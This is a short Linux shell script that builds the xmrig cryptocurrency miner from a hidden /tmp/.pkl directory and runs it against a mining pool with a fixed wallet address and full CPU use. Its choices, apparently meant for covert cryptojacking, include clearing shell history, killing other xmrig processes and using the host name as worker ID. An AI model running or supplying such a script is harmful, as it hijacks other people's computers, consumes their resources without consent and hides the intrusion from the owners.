yum install -y epel-release
history -c
tuned-adm profile throughput-performance

yum install -y hwloc hwloc-plugins hwloc-devel extra-cmake-modules libuv-devel libhwloc-devel libssl-devel wget cmake openssl-devel psmisc openssl-libs git make cmake3 gcc gcc-c++ libstdc++-static automake msr-tools libtool autoconf
killall xmrig

cd /tmp/.pkl

rm -fdr xmrig

git clone https://github.com/xmrig/xmrig.git


mkdir xmrig/build


cd xmrig/scripts && ./build_deps.sh && cd ../build


cmake3 .. -DXMRIG_DEPS=scripts/deps


make -j$(nproc)

/tmp/.pkl/xmrig/scripts/enable_1gb_pages.sh


cd scripts

./xmrig -o rx.unmineable.com:3333 -u BABYDOGE:0x498635f1173F80d3ee516334cf7fAaef21E5a47B -p $HOSTNAME --randomx-1gb-pages --cpu-max-threads-hint=100 -t=16
